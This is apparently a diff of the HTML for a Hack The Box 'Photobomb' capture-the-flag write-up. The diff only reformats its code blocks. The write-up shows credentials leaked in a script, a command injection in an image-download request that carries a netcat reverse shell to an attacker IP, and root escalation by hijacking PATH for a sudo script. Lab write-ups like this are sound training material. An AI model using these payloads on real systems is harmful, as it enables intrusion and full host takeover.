 <p>After trying to brute force the login page with different seclist dictionaries, we decided to have a look at the only file with response 200 in the directory enumeration: http://photobomb.htb/photobomb.js, and bingo! The user and password are there:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>function init() {
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;);
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>  }
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>}
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>window.onload = init;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span>
+<span class="normal"><a href="#__codelineno-15-6">6</a></span>
+<span class="normal"><a href="#__codelineno-15-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>function init() {
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>    document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;);
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>  }
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a>}
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a>window.onload = init;
+</span></code></pre></div></td></tr></table></div>
 We login into the web with:
 + user: pH0t0
 + password: b0Mb!</p>
 <p>After entering user+pass a pannel to download images is displayed.
 Capturing with BurpSuite this HTTP request to download an image we have:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>POST /printer HTTP/1.1
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Host: photobomb.htb
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>Content-Type: application/x-www-form-urlencoded
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>Content-Length: 78
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>Origin: http://photobomb.htb
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>Authorization: Basic cEgwdDA6YjBNYiE=
-</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>Connection: close
-</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>Referer: http://photobomb.htb/printer
-</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>
-</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&amp;dimensions=3000x2000
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span>
+<span class="normal"><a href="#__codelineno-16-11">11</a></span>
+<span class="normal"><a href="#__codelineno-16-12">12</a></span>
+<span class="normal"><a href="#__codelineno-16-13">13</a></span>
+<span class="normal"><a href="#__codelineno-16-14">14</a></span>
+<span class="normal"><a href="#__codelineno-16-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>POST /printer HTTP/1.1
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>Host: photobomb.htb
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>Content-Length: 78
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>Origin: http://photobomb.htb
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a>Authorization: Basic cEgwdDA6YjBNYiE=
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11"></a>Connection: close
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12"></a>Referer: http://photobomb.htb/printer
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14"></a>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15"></a>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&amp;dimensions=3000x2000
+</span></code></pre></div></td></tr></table></div></p>
 <p>Playing a little with this request in BurpSuite (module Repeater) we can infer that the site is using ruby as a programming language. Now we can play a little with the three parameters we have in the request (photo, filetype, and dimensions) and discover that for some reason filetype is injectable. We can add either a reverse shell in ruby or a reverse shell with netcat. Python doesn't work for us here. I go for an nc reverse shell and url-encode it like this:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>POST /printer HTTP/1.1
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Host: photobomb.htb
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>Content-Type: application/x-www-form-urlencoded
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>Content-Length: 164
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>Origin: http://photobomb.htb
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>Authorization: Basic cEgwdDA6YjBNYiE=
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>Connection: close
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>Referer: http://photobomb.htb/printer
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=png;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.80+24444+&gt;/tmp/f&amp;dimensions=3000x2000
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span>
+<span class="normal"><a href="#__codelineno-17-12">12</a></span>
+<span class="normal"><a href="#__codelineno-17-13">13</a></span>
+<span class="normal"><a href="#__codelineno-17-14">14</a></span>
+<span class="normal"><a href="#__codelineno-17-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>POST /printer HTTP/1.1
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>Host: photobomb.htb
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a>Content-Length: 164
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a>Origin: http://photobomb.htb
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10"></a>Authorization: Basic cEgwdDA6YjBNYiE=
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11"></a>Connection: close
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12"></a>Referer: http://photobomb.htb/printer
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14"></a>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15"></a>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=png;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.80+24444+&gt;/tmp/f&amp;dimensions=3000x2000
+</span></code></pre></div></td></tr></table></div>
 <p>Now, in the attacker machine (mine is 10.10.14.80), we listen on port 24444:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>nc -lnvp 24444
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>nc -lnvp 24444
+</span></code></pre></div></td></tr></table></div>
 Once we have the attacker machine listening, we go back to the repeater module in Burp Suite and launch the attack with the SEND button. We will obtain a reverse shell in the attacker machine.</p>
 <p>After that, we run:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>whoami
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>cat /home/wizard/user.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>whoami
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>cat /home/wizard/user.txt
+</span></code></pre></div></td></tr></table></div>
 to get the user flag: <strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong>**</p>
 <h3 id="getting-the-system-flag">Getting the system flag</h3>
 <p>We run some basic commands:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>id
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>id
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>echo $SHELL
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>echo $SHELL
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>/bin/bash
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>uname -a
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>/bin/bash
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>uname -a
+</span></code></pre></div></td></tr></table></div>
 Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Linux photobomb 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sudo -l
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>Linux photobomb 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>sudo -l
+</span></code></pre></div></td></tr></table></div></p>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Matching Defaults entries for wizard on photobomb:
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>User wizard may run the following commands on photobomb:
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>    (root) SETENV: NOPASSWD: /opt/cleanup.sh
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span>
+<span class="normal"><a href="#__codelineno-27-4">4</a></span>
+<span class="normal"><a href="#__codelineno-27-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>Matching Defaults entries for wizard on photobomb:
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4"></a>User wizard may run the following commands on photobomb:
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5"></a>    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</span></code></pre></div></td></tr></table></div>
 <p>Two interesting things here: 1. Our user can modify environmental variables, and 2. Our user can execute /opt/cleanup.sh as root with no need for a password.
 Having a look at the /opt/cleanup.sh file, we can see the command "find" invoked with a relative path:</p>
-<p><div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>#!/bin/bash
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>. /opt/.bashrc
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>cd /home/wizard/photobomb
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a># clean up log files
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
-</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>then
-</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
-</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>  /usr/bin/truncate -s0 log/photobomb.log
-</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>fi
-</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
-</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a># protect the priceless originals
-</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \;
-</span></code></pre></div>
+<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-28-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-28-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-28-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-28-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-28-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-28-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-28-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-28-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-28-10">10</a></span>
+<span class="normal"><a href="#__codelineno-28-11">11</a></span>
+<span class="normal"><a href="#__codelineno-28-12">12</a></span>
+<span class="normal"><a href="#__codelineno-28-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>#!/bin/bash
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>. /opt/.bashrc
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>cd /home/wizard/photobomb
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a># clean up log files
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a>if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a>then
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8"></a>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9"></a>  /usr/bin/truncate -s0 log/photobomb.log
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10"></a>fi
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11"></a>
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12"></a># protect the priceless originals
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13"></a>find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \;
+</span></code></pre></div></td></tr></table></div>
 Knowing that we can modify environmental variables, we are going to create a find file with execution permissions in our folder, and then we are going to add our folder in the first position of the $PATH environmental variable. With that we will execute /opt/cleanup.sh and escalate to root.</p>
-<p><div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>cd ~
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>echo bash &gt; find
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>chmod +x find
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>sudo PATH=$PWD:$PATH /opt/cleanup.sh
-</span></code></pre></div>
+<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span>
+<span class="normal"><a href="#__codelineno-29-3">3</a></span>
+<span class="normal"><a href="#__codelineno-29-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>cd ~
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a>echo bash &gt; find
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a>chmod +x find
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a>sudo PATH=$PWD:$PATH /opt/cleanup.sh
+</span></code></pre></div></td></tr></table></div>
 Now, we are root:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>id
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>id
+</span></code></pre></div></td></tr></table></div>
 <p>Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>uid=0(root) gid=0(root) groups=0(root)
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></td></tr></table></div></p>
 <p>And the flag:
